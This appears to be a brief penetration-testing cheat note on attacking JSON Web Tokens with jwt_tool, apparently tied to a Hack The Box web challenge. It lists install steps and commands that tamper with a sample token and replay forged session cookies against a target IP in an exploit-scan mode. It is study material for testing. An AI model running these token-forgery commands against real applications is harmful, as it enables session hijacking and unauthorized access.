# JWT Toolkit: Attacking JWT Tokens

1. Download [JSON Web Token Toolkit](
https://github.com/ticarpi/jwt_tool.git)
2. Install required libraries

        pip3 install pycryptodomex

3. Tamper an existing JWT token by passing `-T` option

        python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -T

4. Send tampered tokens directly to a target application

        python jwt_tool.py -t http://165.232.35.118:30532/ -rc "session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw" -cv "Welcome" -M er

## References

* https://ncu204.com/post/hack_the_box/under-construction/
* https://www.tariqhawis.com/htb-under-construction-web-challange/
* https://github.com/ticarpi/jwt_tool/wiki
* https://www.pingidentity.com/en/company/blog/posts/2019/jwt-security-nobody-talks-about.html
